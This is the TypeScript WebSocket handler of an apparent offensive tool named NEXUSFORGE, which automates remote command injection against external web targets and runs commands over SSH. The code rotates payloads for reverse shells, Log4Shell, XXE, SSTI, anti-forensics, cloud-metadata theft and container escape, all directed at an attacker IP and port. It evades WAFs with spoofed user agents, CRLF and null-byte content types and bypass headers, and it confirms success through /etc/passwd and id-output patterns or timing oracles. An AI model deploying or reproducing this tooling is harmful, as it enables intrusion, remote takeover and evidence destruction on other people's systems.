import type { WebSocket } from "ws";
import { sshStreamExec, type SshOptions } from "../lib/sshExec.js";
import {
  applyQuantumBypass,
  buildPayloadVariants,
  buildPolymorphicPayload,
  buildHttpBypassHeaders,
  buildWafSpecificHeaders,
  buildSSTIPayloads,
  buildLog4ShellPayloads,
  buildXXEPayloads,
  buildStealthPayloads,
  buildTimingPayloads,
  buildWindowsPayloads,
  buildWindowsTimingPayloads,
  buildWindowsReverseShells,
  buildAntiForensicsPayloads,
  buildReverseShells,
  buildCloudMetaPayloads,
  buildContainerEscapes,
  buildContextPayloads,
  buildAdaptivePayloads,
  isSelfTarget,
} from "../lib/bypassEngine.js";
import { probeTargetEnvironment } from "../lib/targetProbe.js";
import { logInjection }  from "../lib/injectionLogger.js";
import { logger }        from "../lib/logger.js";

interface ExecRequest {
  cmd:            string;
  engine?:        string;
  mode?:          string;
  injectionUrl?:  string;
  injectParam?:   string;
  httpMethod?:    string;
  customHeaders?: string;
  attackerIp?:    string;
  attackerPort?:  string;
  sshHost?:       string;
  sshPort?:       number;
  sshUser?:       string;
  sshPassword?:   string;
  sshKey?:        string;
}

function send(ws: WebSocket, obj: unknown): void {
  if (ws.readyState === 1) {
    try { ws.send(JSON.stringify(obj)); } catch { /* connection closed mid-send */ }
  }
}

const UA_POOL = [
  "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
  "curl/8.7.1",
  "curl/8.10.1",
  "python-requests/2.32.3",
  "Wget/1.21.4",
  "Go-http-client/2.0",
  "Apache-HttpClient/4.5.14",
  "okhttp/4.12.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36 Edg/131.0.2903.86",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
  "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.104 Mobile Safari/537.36",
  "AmazonCloudFront",
  "Googlebot-News",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  // 2026 browser strings
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36 Edg/136.0.3240.50",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.99 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
  "Dalvik/2.1.0 (Linux; U; Android 15; Pixel 9 Build/AP4A.250105.002)",
  "python-requests/2.32.3",
  "axios/1.8.4",
  "node-fetch/3.3.2",
  "curl/8.12.1",
  "libwww-perl/6.80",
  "Go-http-client/2.0",
  "Java/22.0.2",
];

const CONTENT_TYPE_VARIANTS = [
  "application/x-www-form-urlencoded",
  "application/x-www-form-urlencoded; charset=UTF-8",
  "application/x-www-form-urlencoded;charset=utf-8",
  "application/x-www-form-urlencoded ; charset=UTF-8",
  "application/x-url-encoded",
  "application/x-www-form-urlencoded\r\nX-Injected: a",
  "application/x-www-form-urlencoded\t",
  "application/x-www-form-urlencoded; charset=utf-8",
  "application/x-www-form-urlencoded%00",
  "multipart/form-data; boundary=----FormBoundary7MA4YWxkTrZu0gW",
  "application/json",
  "application/json; charset=UTF-8",
  "text/xml; charset=utf-8",
  "application/x-www-form-urlencoded\x00",
];

function detectWaf(status: number, body: string): string | null {
  const b = body.toLowerCase();
  if (status === 406 || b.includes("not acceptable")) return "ModSecurity/406";
  if (status === 403) {
    if (b.includes("cloudflare")) return "Cloudflare";
    if (b.includes("akamai") || b.includes("reference #")) return "Akamai";
    if (b.includes("incapsula") || b.includes("imperva")) return "Imperva/Incapsula";
    if (b.includes("aws waf") || b.includes("awswaf")) return "AWS WAF";
    if (b.includes("f5") || b.includes("big-ip")) return "F5 ASM";
    if (b.includes("barracuda")) return "Barracuda";
    if (b.includes("sucuri")) return "Sucuri";
    if (b.includes("blocked") || b.includes("forbidden")) return "Generic WAF";
  }
  if (status === 429) return "Rate-limit/WAF";
  if (b.includes("security event") || b.includes("access denied")) return "WAF";
  return null;
}

function detectCommandOutput(body: string): boolean {
  /* Linux / Unix RCE patterns */
  const linuxHit =
    /uid=\d+\(\w+\)\s+gid=\d+/.test(body)                           ||
    /root:x:0:0:/.test(body)                                         ||
    /^[a-z_][a-z0-9_-]{0,31}:x:\d+:\d+:[^:]*:[^:]*:[^\n]+$/m.test(body) ||
    /Linux \S+ \d+\.\d+\.\d+/.test(body)                            ||
    (/total \d+/.test(body) && /drwx/.test(body))                   ||
    /\binet\b[^\n]+\d+\.\d+\.\d+\.\d+/.test(body)                  ||
    /^PATH=\//m.test(body)                                           ||
    /^HOME=\//m.test(body)                                           ||
    /^USER=\w+$/m.test(body)                                         ||
    /^SHELL=\//m.test(body)                                          ||
    /^LOGNAME=\w+$/m.test(body)                                      ||
    /drwxr[-x]r[-x]\s+\d+\s+\w+\s+\w+/.test(body)                  ||
    /\/usr\/bin\/(?:perl|python3?|ruby|node|php)/.test(body)        ||
    /CPU\(s\):\s+\d+/i.test(body);

  /* Windows RCE patterns */
  const winHit =
    /Microsoft Windows \[Version \d+\.\d+\.\d+\.\d+\]/.test(body)  ||
    /Windows \w+ \[Version \d+\.\d+\.\d+\.\d+\]/.test(body)        ||
    /\bNT AUTHORITY\\\w+/.test(body)                                 ||
    /\bVolume Serial Number is [0-9A-F]{4}-[0-9A-F]{4}/i.test(body) ||
    /\bDirectory of [A-Za-z]:\\/i.test(body)                        ||
    /\bOS Name:\s+Microsoft Windows/i.test(body)                    ||
    /\bProcessor\(s\):\s+\d+ Processor\(s\) Installed/i.test(body) ||
    /^C:\\[^\n]+>$/m.test(body)                                      ||
    /COMPUTERNAME=\w+/.test(body)                                    ||
    /^USERPROFILE=C:\\/m.test(body)                                  ||
    /\bWindowsDirectory\b[^\n]+C:\\Windows/i.test(body)             ||
    /\bPS [A-Za-z]:\\[^\n]+>/.test(body)                            ||
    /\bwin32_process\b/i.test(body)                                  ||
    /\bSystemRoot=C:\\Windows\b/.test(body);

  return linuxHit || winHit;
}

interface AttemptResult {
  blocked:          boolean;
  done:             boolean;
  responseLen:      number;
  successIndicator: boolean;
  elapsed:          number;
}

async function fetchAttempt(
  ws:           WebSocket,
  injectionUrl: string,
  injectParam:  string,
  httpMethod:   string,
  headers:      Record<string, string>,
  payload:      string,
  attemptNum:   number,
  label:        string,
  baselineLen:  number,
  baselineBody: string,
): Promise<AttemptResult> {
  const t0 = Date.now();
  const NO: AttemptResult = { blocked: false, done: false, responseLen: 0, successIndicator: false, elapsed: 0 };
  try {
    const parsedUrl = new URL(injectionUrl);
    const method    = httpMethod.toUpperCase();

    send(ws, { type: "data", chunk: `\n[${label}]\n` });
    send(ws, { type: "data", chunk: `  ${method} ${parsedUrl.origin}${parsedUrl.pathname} param=${injectParam}\n` });
    send(ws, { type: "data", chunk: `  payload: ${payload.slice(0, 100)}${payload.length > 100 ? "\u2026" : ""}\n` });

    let response: Response;
    const h = { ...headers };

    if (method === "GET" || method === "DELETE") {
      parsedUrl.searchParams.set(injectParam, payload);
      response = await fetch(parsedUrl.toString(), { method, headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "POST" || method === "PUT" || method === "PATCH") {
      h["Content-Type"] = CONTENT_TYPE_VARIANTS[attemptNum % CONTENT_TYPE_VARIANTS.length]!;
      const body = new URLSearchParams({ [injectParam]: payload }).toString();
      response = await fetch(parsedUrl.toString(), { method, headers: h, body, signal: AbortSignal.timeout(30000) });
    } else if (method === "JSON") {
      h["Content-Type"] = "application/json";
      response = await fetch(parsedUrl.toString(), { method: "POST", headers: h,
        body: JSON.stringify({ [injectParam]: payload }), signal: AbortSignal.timeout(30000) });
    } else if (method === "MULTIPART") {
      const fd = new FormData();
      fd.append(injectParam, payload);
      response = await fetch(parsedUrl.toString(), { method: "POST",
        headers: { "User-Agent": h["User-Agent"] ?? "" }, body: fd, signal: AbortSignal.timeout(30000) });
    } else if (method === "COOKIE") {
      h["Cookie"] = `${injectParam}=${encodeURIComponent(payload)}`;
      response = await fetch(parsedUrl.toString(), { method: "GET", headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "HEADER") {
      h[injectParam] = payload;
      response = await fetch(parsedUrl.toString(), { method: "GET", headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "PATH") {
      const pathUrl = new URL(injectionUrl);
      pathUrl.pathname = pathUrl.pathname.replace(/\/+$/, "") + "/" + encodeURIComponent(payload);
      response = await fetch(pathUrl.toString(), { method: "GET", headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "XML") {
      h["Content-Type"] = "application/xml";
      const xmlBody = `<?xml version="1.0"?><root><${injectParam}>${payload.replace(/&/g, "&amp;").replace(/</g, "&lt;")}</${injectParam}></root>`;
      response = await fetch(parsedUrl.toString(), { method: "POST", headers: h, body: xmlBody, signal: AbortSignal.timeout(30000) });
    } else {
      send(ws, { type: "error", message: `Unsupported method: ${method}` });
      return { ...NO, done: true, elapsed: Date.now() - t0 };
    }

    const text       = await response.text();
    const rLen       = text.length;
    const waf        = detectWaf(response.status, text);
    const execOutput = detectCommandOutput(text);
    const hdrLines   = Array.from(response.headers.entries()).map(([k, v]) => `  ${k}: ${v}`).slice(0, 8).join("\n");

    send(ws, { type: "data", chunk: `  HTTP ${response.status} ${response.statusText}  [${rLen}b]\n${hdrLines}\n` });

    if (baselineLen > 0) {
      const diff = rLen - baselineLen;
      if (Math.abs(diff) > 80) {
        send(ws, { type: "data", chunk: `  \u0394 length: ${diff > 0 ? "+" : ""}${diff}b vs baseline ${baselineLen}b \u2190 SIGNIFICANT CHANGE\n` });
      }
    }

    const elapsed = Date.now() - t0;
    send(ws, { type: "data", chunk: `  ${elapsed}ms\n` });

    if (execOutput) {
      // Differential false-positive guard: only fire CONFIRMED if the baseline did NOT
      // already contain the same signatures, OR if the length change is significant
      const baselineAlsoMatched = baselineBody.length > 100 && detectCommandOutput(baselineBody);
      const lenDiff = baselineLen > 0 ? Math.abs(rLen - baselineLen) : 999;
      if (baselineAlsoMatched && lenDiff < 150) {
        send(ws, { type: "data", chunk: `\n  \u26a0 [FP-GUARD] Signature matched BUT baseline response also contained cmd-output patterns\n` });
        send(ws, { type: "data", chunk: `  \u0394len=${lenDiff}b — possible false positive (documentation page?)\n` });
        send(ws, { type: "data", chunk: `  Use OOB or timing mode for zero-noise confirmation\n` });
      } else {
        send(ws, { type: "data", chunk: `\n\u2714 EXECUTION CONFIRMED — command output detected (${baselineLen > 0 ? "\u0394len:" + lenDiff + "b vs baseline" : "no baseline reference"})\n` });
        send(ws, { type: "data", chunk: `--- RESPONSE ---\n${text.slice(0, 2000)}\n` });
        return { blocked: false, done: true, responseLen: rLen, successIndicator: true, elapsed };
      }
    }

    if (text.length > 0 && text.length < 4096) {
      send(ws, { type: "data", chunk: `--- RESPONSE ---\n${text.slice(0, 1500)}\n` });
    } else if (text.length > 0) {
      send(ws, { type: "data", chunk: `--- RESPONSE (first 1500b of ${rLen}b) ---\n${text.slice(0, 1500)}\n` });
    }

    if (waf) {
      send(ws, { type: "data", chunk: `\n  \u2716 WAF: ${waf}\n` });
      return { blocked: true, done: false, responseLen: rLen, successIndicator: false, elapsed };
    }

    return { blocked: false, done: true, responseLen: rLen, successIndicator: false, elapsed };
  } catch (err: unknown) {
    const msg = (err as Error).message ?? String(err);
    send(ws, { type: "data", chunk: `  [FETCH ERROR] ${msg}\n` });
    return { ...NO, done: attemptNum >= 2, elapsed: Date.now() - t0 };
  }
}

async function handleRemoteInject(
  ws:           WebSocket,
  injectionUrl: string,
  injectParam:  string,
  httpMethod:   string,
  customHeaders: string,
  processed:    string,
  start:        number,
  originalCmd:  string,
  engine:       string,
  mode:         string,
  attackerIp:   string,
  attackerPort: string,
): Promise<void> {
  if (isSelfTarget(injectionUrl)) {
    send(ws, { type: "error", message: "Self-targeting is disabled — configure an external target URL." });
    ws.close();
    return;
  }

  let parsedUrl: URL;
  try { parsedUrl = new URL(injectionUrl); } catch {
    send(ws, { type: "error", message: `Invalid injection URL: ${injectionUrl}` });
    ws.close();
    return;
  }

  send(ws, { type: "data", chunk:
    `[NEXUSFORGE] Remote Injection\n` +
    `[TARGET]    ${parsedUrl.toString()}\n` +
    `[METHOD]    ${httpMethod}\n` +
    `[PARAM]     ${injectParam}\n` +
    `[MODE]      ${mode.toUpperCase()}\n` +
    `\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n`
  });

  send(ws, { type: "data", chunk: `\n[PROBE] Fingerprinting ${parsedUrl.hostname}...\n` });
  const env = await probeTargetEnvironment(injectionUrl, 8000).catch(() => null);
  if (env?.reachable) {
    send(ws, { type: "data", chunk:
      `[ENV] Server   : ${env.server    || "unknown"}\n` +
      `[ENV] Language : ${env.language  || "unknown"}\n` +
      `[ENV] Framework: ${env.framework || "unknown"}\n` +
      (env.cms ? `[ENV] CMS      : ${env.cms}\n` : "") +
      `[ENV] WAF      : ${env.waf ? `${env.waf} [confidence: ${env.wafConfidence}]` : "none detected"}\n` +
      `[ENV] Response : HTTP ${env.statusCode} (${env.responseTime}ms, ${env.bodyLength}b)\n`
    });
    for (const hint of env.injectHints.slice(0, 4)) {
      send(ws, { type: "data", chunk: `[HINT] ${hint}\n` });
    }
  } else {
    send(ws, { type: "data", chunk: "[WARN] Target probe failed — proceeding with injection\n" });
  }
  send(ws, { type: "data", chunk: "\n" });

  const preBuiltCookie = (() => {
    if (!customHeaders.trim()) return "";
    for (const line of customHeaders.split(/\r?\n/)) {
      if (/^cookie\s*:/i.test(line)) return line.replace(/^cookie\s*:\s*/i, "").trim();
    }
    return "";
  })();

  let baselineLen  = -1;
  let baselineMs   = 0;
  let baselineBody = "";
  try {
    send(ws, { type: "data", chunk: "[BASELINE] Measuring clean response...\n" });
    const bUrl = new URL(injectionUrl);
    if (httpMethod === "GET") bUrl.searchParams.set(injectParam, "nexus_baseline_probe");
    bUrl.searchParams.set("_nx", Math.random().toString(36).slice(2, 10));
    const bHdrs: Record<string, string> = {
      "User-Agent": UA_POOL[0]!,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache",
    };
    if (preBuiltCookie) bHdrs["Cookie"] = preBuiltCookie;
    const bT0   = Date.now();
    const bRes  = await fetch(bUrl.toString(), {
      method: "GET",
      headers: bHdrs,
      signal:  AbortSignal.timeout(10000),
    });
    const bText  = await bRes.text();
    baselineLen  = bText.length;
    baselineBody = bText;
    baselineMs   = Date.now() - bT0;
    const bWarn = detectCommandOutput(bText) ? " \u26a0 baseline already contains cmd-output signatures — FP-guard active" : "";
    send(ws, { type: "data", chunk: `[BASELINE] HTTP ${bRes.status} \u2014 ${baselineLen} bytes \u2014 ${baselineMs}ms${bWarn}\n\n` });
  } catch {
    send(ws, { type: "data", chunk: "[BASELINE] Could not measure — skipping diff analysis\n\n" });
  }

  let payloadVariants: string[];
  if (mode === "ssti") {
    payloadVariants = buildSSTIPayloads(originalCmd);
  } else if (mode === "log4shell") {
    payloadVariants = buildLog4ShellPayloads(attackerIp, attackerPort);
  } else if (mode === "xxe") {
    payloadVariants = buildXXEPayloads(attackerIp, attackerPort);
  } else if (mode === "timing" || mode === "blind") {
    payloadVariants = buildTimingPayloads(7);
  } else if (mode === "stealth") {
    payloadVariants = buildStealthPayloads(originalCmd);
  } else if (mode === "windows") {
    payloadVariants = buildWindowsPayloads(originalCmd);
  } else if (mode === "windows_timing") {
    payloadVariants = buildWindowsTimingPayloads(7);
  } else if (mode === "windows_rev") {
    payloadVariants = buildWindowsReverseShells(attackerIp, attackerPort);
  } else if (mode === "antiforensics") {
    payloadVariants = buildAntiForensicsPayloads(originalCmd);
  } else if (mode === "rev_shell") {
    payloadVariants = buildReverseShells(attackerIp, attackerPort);
  } else if (mode === "cloud") {
    payloadVariants = buildCloudMetaPayloads(originalCmd);
  } else if (mode === "container") {
    payloadVariants = buildContainerEscapes(originalCmd);
  } else if (mode === "polymorphic") {
    // Generate 30 unique polymorphic variants — each call produces a different
    // byte sequence (random junk variables + random encoding), defeating static WAF sigs
    payloadVariants = Array.from({ length: 30 }, () => buildPolymorphicPayload(originalCmd, "quantum"));
  } else {
    payloadVariants = buildPayloadVariants(processed);
  }

  const detectedWaf    = env?.waf ?? null;
  const bypassHeaderSets = detectedWaf
    ? buildWafSpecificHeaders(detectedWaf)
    : buildHttpBypassHeaders();
  const MAX_ATTEMPTS   = Math.min(payloadVariants.length, 60);
  let consecutiveBlocks = 0;

  if (detectedWaf) {
    send(ws, { type: "data", chunk: `[STRATEGY] WAF "${detectedWaf}" detected — using targeted bypass header sets\n` });
  }
  send(ws, { type: "data", chunk: `[INJECT] Starting ${MAX_ATTEMPTS} attempts across ${bypassHeaderSets.length} WAF bypass header sets\n` });

  for (let i = 0; i < MAX_ATTEMPTS; i++) {
    if (ws.readyState !== 1) break;

    const payload     = payloadVariants[i]!;
    const bypassHdrs  = bypassHeaderSets[i % bypassHeaderSets.length]!;
    const ua          = UA_POOL[i % UA_POOL.length]!;

    const headers: Record<string, string> = {
      "User-Agent":      ua,
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate",
      "Connection":      "keep-alive",
      "Cache-Control":   "no-cache",
      ...bypassHdrs,
    };

    if (customHeaders.trim()) {
      for (const line of customHeaders.split(/\r?\n/)) {
        const sep = line.indexOf(":");
        if (sep > 0) headers[line.slice(0, sep).trim()] = line.slice(sep + 1).trim();
      }
    }

    const bypassTag = i === 0 ? "direct" : `bypass-${i}:${bypassHdrs["User-Agent"]?.split("/")[0] ?? ""}`;
    const label     = `${i + 1}/${MAX_ATTEMPTS} [${bypassTag}]`;
    const result    = await fetchAttempt(ws, injectionUrl, injectParam, httpMethod, headers, payload, i, label, baselineLen, baselineBody);

    if (result.elapsed > 5500 && baselineMs < 1500) {
      const ratio = baselineMs > 0 ? (result.elapsed / baselineMs).toFixed(1) : "∞";
      send(ws, { type: "data", chunk: `\n  [TIMING] ${result.elapsed}ms response (baseline: ${baselineMs}ms, ratio: ${ratio}x) — POSSIBLE BLIND RCE\n` });
      send(ws, { type: "data", chunk: `  Payload index ${i} triggered timing oracle — escalating timing variants\n` });
      payloadVariants.splice(i + 1, 0, ...buildTimingPayloads(10).slice(0, 5), ...buildTimingPayloads(5).slice(0, 5));
    } else if (result.elapsed > 3500 && baselineMs < 800) {
      send(ws, { type: "data", chunk: `\n  [TIMING] Mild delay: ${result.elapsed}ms vs baseline ${baselineMs}ms — monitoring\n` });
    }

    if (result.done || result.successIndicator) {
      const elapsed = Date.now() - start;
      void logInjection(originalCmd, `remote/${httpMethod.toLowerCase()}`, mode, elapsed);
      send(ws, { type: "end", code: 0, elapsed });
      ws.close();
      return;
    }

    if (result.blocked) {
      consecutiveBlocks++;
      send(ws, { type: "data", chunk: `[ESCALATE] WAF blocked (${consecutiveBlocks}) — rotating to variant ${i + 2}...\n` });
      if (consecutiveBlocks === 5) {
        send(ws, { type: "data", chunk: `[STRATEGY] Injecting stealth + timing payloads into queue...\n` });
        const extra = [
          ...buildTimingPayloads(7).slice(0, 6),
          ...buildStealthPayloads(originalCmd).slice(0, 6),
        ];
        payloadVariants.splice(i + 1, 0, ...extra);
      }
      if (consecutiveBlocks === 8) {
        send(ws, { type: "data", chunk: `[STRATEGY] Max evasion — injecting context-aware + adaptive payloads...\n` });
        const ctxExtra = buildContextPayloads(
          originalCmd, "unknown", detectedWaf, "unknown", attackerIp, attackerPort
        ).slice(0, 12);
        const adaptExtra = buildAdaptivePayloads(originalCmd, ["bash","sh","python3","perl","php","curl","wget","nc","base64"]).slice(0, 8);
        payloadVariants.splice(i + 1, 0, ...ctxExtra, ...adaptExtra);
      }
      await new Promise(r => setTimeout(r, 150 + Math.min(i * 30, 600)));
    } else {
      consecutiveBlocks = 0;
    }
  }

  void logInjection(originalCmd, engine, mode, Date.now() - start);
  send(ws, { type: "end", code: 1, elapsed: Date.now() - start });
  if (ws.readyState === 1) ws.close();
}


export function handleStreamExec(ws: WebSocket): void {
  ws.once("message", (raw) => {
    let req: ExecRequest;
    try {
      req = JSON.parse(raw.toString()) as ExecRequest;
    } catch {
      send(ws, { type: "error", message: "invalid JSON" });
      ws.close();
      return;
    }

    const {
      cmd            = "",
      engine         = "bash",
      mode           = "classic",
      injectionUrl   = "",
      injectParam    = "cmd",
      httpMethod     = "GET",
      customHeaders  = "",
      attackerIp     = "127.0.0.1",
      attackerPort   = "4444",
      sshHost,
      sshPort        = 22,
      sshUser        = "root",
      sshPassword,
      sshKey,
    } = req;

    if (!cmd.trim()) {
      send(ws, { type: "error", message: "cmd is required" });
      ws.close();
      return;
    }

    const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);
    const start     = Date.now();

    // ── Remote HTTP injection ──────────────────────────────────────────────
    if (injectionUrl.trim()) {
      if (isSelfTarget(injectionUrl.trim())) {
        send(ws, { type: "error", message: "Self-targeting is disabled — configure an external target URL." });
        ws.close();
        return;
      }
      logger.info({ injectionUrl, method: httpMethod, param: injectParam, mode }, "ws/exec remote");
      void handleRemoteInject(ws, injectionUrl.trim(), injectParam, httpMethod, customHeaders,
        processed, start, cmd, engine, mode, attackerIp, attackerPort);
      return;
    }

    // ── SSH remote execution ───────────────────────────────────────────────
    if (sshHost?.trim()) {
      const opts: SshOptions = {
        host:       sshHost.trim(),
        port:       Number(sshPort) || 22,
        username:   (sshUser ?? "root").trim(),
        password:   sshPassword?.trim() || undefined,
        privateKey: sshKey?.trim() || undefined,
        timeoutMs:  20_000,
      };
      logger.info({ host: opts.host, port: opts.port, user: opts.username, mode }, "ws/exec ssh");

      send(ws, { type: "data", chunk:
        `[NEXUSFORGE] SSH Remote Execution\n` +
        `[TARGET]  ${opts.username}@${opts.host}:${opts.port}\n` +
        `[CMD]     ${processed}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `[SSH] Connecting...\n`,
      });

      const teardown = sshStreamExec(
        opts,
        processed,
        (chunk) => send(ws, { type: "data", chunk }),
        (code, elapsed) => {
          void logInjection(cmd, `ssh/${engine}`, mode, elapsed);
          send(ws, { type: "end", code: code ?? -1, elapsed });
          if (ws.readyState === 1) ws.close();
        },
        (err) => {
          send(ws, { type: "error", message: `SSH failed: ${err.message}` });
          void logInjection(cmd, `ssh/${engine}`, mode, Date.now() - start);
          if (ws.readyState === 1) ws.close();
        },
      );

      ws.on("close", () => teardown());
      return;
    }

    // ── No target provided — refuse local execution ────────────────────────
    send(ws, { type: "error", message:
      "No execution target specified.\n\n" +
      "NEXUSFORGE executes on remote targets only — it never runs commands on the server itself.\n\n" +
      "• HTTP injection : provide injectionUrl + injectParam + httpMethod\n" +
      "• SSH execution  : provide sshHost + sshUser + (sshPassword or sshKey)",
    });
    ws.close();
  });
}
